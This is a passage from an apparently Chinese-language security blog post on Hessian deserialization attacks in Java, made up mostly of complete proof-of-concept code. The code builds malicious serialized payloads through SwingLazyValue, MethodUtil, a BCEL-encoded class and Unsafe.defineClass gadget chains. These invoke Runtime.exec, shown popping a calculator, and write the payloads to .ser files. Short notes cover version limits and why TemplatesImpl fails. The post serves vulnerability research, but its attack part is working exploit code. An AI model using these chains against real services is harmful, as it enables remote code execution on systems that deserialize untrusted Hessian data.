nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, uiDefaults1, <span class="literal">null</span>,</span><br><span class="line">                <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, uiDefaults2, <span class="literal">null</span>,</span><br><span class="line">                <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tf</span> <span class="operator">=</span> s.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        tf.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tf.set(s, tbl);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian2.ser&quot;</span>));</span><br><span class="line">        hessian2Output.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.writeObject(s);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造恶意的序列化数据包触发toString</p>
<p>MimeTypeParameterList+SwingLazyValue+MethodUtil</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commandexec_toString</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invokeMethod</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;crumbledwall&quot;</span>, slz);</span><br><span class="line"></span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">ml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ps</span> <span class="operator">=</span> ml.getClass().getDeclaredField(<span class="string">&quot;parameters&quot;</span>);</span><br><span class="line">        ps.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ps.set(ml, uiDefaults);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] result;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        oo.writeObject(ml);</span><br><span class="line">        oo.flush();</span><br><span class="line">        result = bos.toByteArray();</span><br><span class="line">        <span class="type">byte</span>[] wrapper = <span class="keyword">new</span> <span class="title class_">byte</span>[result.length + <span class="number">1</span>];</span><br><span class="line">        wrapper[<span class="number">0</span>] = <span class="number">67</span>;</span><br><span class="line">        System.arraycopy(result, <span class="number">0</span>, wrapper, <span class="number">1</span>, result.length);</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;xx.ser&quot;</span>), wrapper);</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>



<p>payload</p>
<p>恶意类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaWrapper_bcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JavaWrapper_bcel</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            Object[] ags = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$a3$dbn$ad$fahi$7dS$3ch$J$fb$e2AR$91H$c3$834$88$K$P$kd$3a$s5$cdvw3$3b$V$7e$96$X$c4$83$l$e0G$89$bbKT0$c9$dc$93$7b$ee$9ds$cf$cc$bc$bd$bf$bc$C$d8$c2$8a$83$MJ$O$s1$95$c5t$8c36fm$cc1dv$94$af$cc$$C$aaR$3dg$b0$ea$c1$b5d$Ym$u_$k$f5$ba$z$a9$cfx$cb$p$a6$d0$I$E$f7$ce$b9Vq$feEZ$e6FEq$ed$90$df$f2$L$cd$c3P$ea$ab$96$90$5e$8d$n$7d$d5$e5$cag$uU$$$h$j$w$bb$k$f7$dbn$d3h$e5$b7k$c9$u$ae$db$b7$M$e3$ff$94$Z$9c$fd$3b$nC$a3$C$3f$b21Oy3$e8i$n$PT$3c$b6$f8$7b$dcf$ac$90$83$8d$ac$8d$85$i$WQfX$PB$e9$977x$d9m$deGFv$dd$bd0$f4$94$e0$89$a6$5b$e7$9e$e8y$dc$Ez$93drX$c22$c3$d8o$5d$a2$fa$de$8e$5b$j$v$M$Z$eeS$df$s$Z$f2$7d$f6$b4$e7$h$d5$r$9fN$5b$9a$ef$a4X$a96$fe$f4$d0M$zy$t$F$c3j$e5$9fW$faA$9d$e8$40$c8$u$aa$91$d34$7df$bc$G$c0$e2$xS$i$a4$cc$rd$84$e9$b5$t$b0$87$a4$ecP$cc$q$q$c3$Q$c5$dcg$D$e10$e1$mF0J$5d$f1$e1$edD$Mp$9e1PH$3d$c2$ba$e8$x8$84$40$8a$fa$ac$l$w$O$c6$90$t$y$d0$b6$88$Z$a7$3d$91$9c$v$7e$A$f4$V$f5$iw$C$A$A&quot;</span>,<span class="string">&quot;s&quot;</span>&#125;&#125;;</span><br><span class="line">            UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, ags);</span><br><span class="line">            Reflections.setFieldValue(swingLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            Object[] keyValueList = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;abc&quot;</span>, swingLazyValue&#125;;</span><br><span class="line">            <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">            <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">            Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">            Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">            hashtable1.put(<span class="string">&quot;a&quot;</span>, uiDefaults1);</span><br><span class="line">            hashtable2.put(<span class="string">&quot;a&quot;</span>, uiDefaults2);</span><br><span class="line">            <span class="comment">//hessian序列</span></span><br><span class="line">            serObj(hashtable1, hashtable2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serObj</span><span class="params">(Object hashtable1, Object hashtable2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">4</span>);</span><br><span class="line">            Class&lt;?&gt; nodeC;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">            nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">4</span>);</span><br><span class="line">            Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable1, hashtable1, <span class="literal">null</span>));</span><br><span class="line">            Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable2, hashtable2, <span class="literal">null</span>));</span><br><span class="line">            Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">            <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian.ser&quot;</span>));</span><br><span class="line">            hessian2Output.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">            hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">            hessian2Output.writeObject(s);</span><br><span class="line">            hessian2Output.flush();</span><br><span class="line">            hessian2Output.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="自定义defineClass"><a href="#自定义defineClass" class="headerlink" title="自定义defineClass"></a>自定义defineClass</h3><p>只能在4.x运行,本地4.0.38可以运行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.misc.MethodUtil;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hessian_demo_main</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">    <span class="keyword">static</span>  <span class="type">byte</span>[] bcode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bcode = Base64.decode(<span class="string">&quot;yv66vgAAADIAHwoABgARCQASABMIABQKABUAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTHByaW50OwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAH3ByaW50LmphdmEgZnJvbSBJbnB1dEZpbGVPYmplY3QMAAcACAcAGQwAGgAbAQAJcHJpbnQgb2shBwAcDAAdAB4BAAVwcmludAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAIAAQAHAAgAAQAJAAAALwABAAEAAAAFKrcAAbEAAAACAAoAAAAGAAEAAAABAAsAAAAMAAEAAAAFAAwADQAAAAgADgAIAAEACQAAACUAAgAAAAAACbIAAhIDtgAEsQAAAAEACgAAAAoAAgAAAAMACAAEAAEADwAAAAIAEA==&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Base64DecodingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invoke</span> <span class="operator">=</span> MethodUtil.class.getMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> Unsafe.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class, ClassLoader.class, ProtectionDomain.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">unsafe</span> <span class="operator">=</span> f.get(<span class="literal">null</span>);</span><br><span class="line">        Object[] ags = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invoke, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;defineClass, unsafe, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;print&quot;</span>, bcode, <span class="number">0</span>, bcode.length, <span class="literal">null</span>, <span class="literal">null</span>&#125;&#125;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, ags);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;print&quot;</span>, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        Object[] keyValueList = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;abc&quot;</span>, swingLazyValue&#125;;</span><br><span class="line">        Object[] keyValueList1 = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ccc&quot;</span>, swingLazyValue1&#125;;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList1);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList1);</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable3 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable4 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable1.put(<span class="string">&quot;a&quot;</span>, uiDefaults1);</span><br><span class="line">        hashtable2.put(<span class="string">&quot;a&quot;</span>, uiDefaults2);</span><br><span class="line">        hashtable3.put(<span class="string">&quot;b&quot;</span>, uiDefaults3);</span><br><span class="line">        hashtable4.put(<span class="string">&quot;b&quot;</span>, uiDefaults4);</span><br><span class="line">        serObj(hashtable1, hashtable2, hashtable3, hashtable4);</span><br><span class="line">        readObj();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serObj</span><span class="params">(Object hashtable1, Object hashtable2, Object hashtable3, Object hashtable4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">4</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable1, hashtable1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable2, hashtable2, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">2</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable3, hashtable3, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">3</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable4, hashtable4, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian.ser&quot;</span>));</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(s);</span><br><span class="line">	        hessian2Output.close();</span><br><span class="line">	    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="为什么Hessian无法触发TemplatesImpl类"><a href="#为什么Hessian无法触发TemplatesImpl类" class="headerlink" title="为什么Hessian无法触发TemplatesImpl类"></a>为什么Hessian无法触发TemplatesImpl类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">是因为Hessian2，Hessian2Input与Hessian2Output 均不能对<span class="keyword">private</span>、<span class="keyword">transient</span>修饰的成员进行序列化或者反序列化</span><br><span class="line">对于ObjectInput与ObjectOutput，除非相关类对readObject或者writeObject进行了重写，否则也无法对<span class="keyword">transient</span>修饰的成员的变量做操作</span><br><span class="line">TemplateImpl的_tfactory属性虽然是<span class="keyword">transient</span>修饰，但其重写了readObject方法，方法中会生成_tfactory的实例，</span><br></pre></td></tr></table></figure>

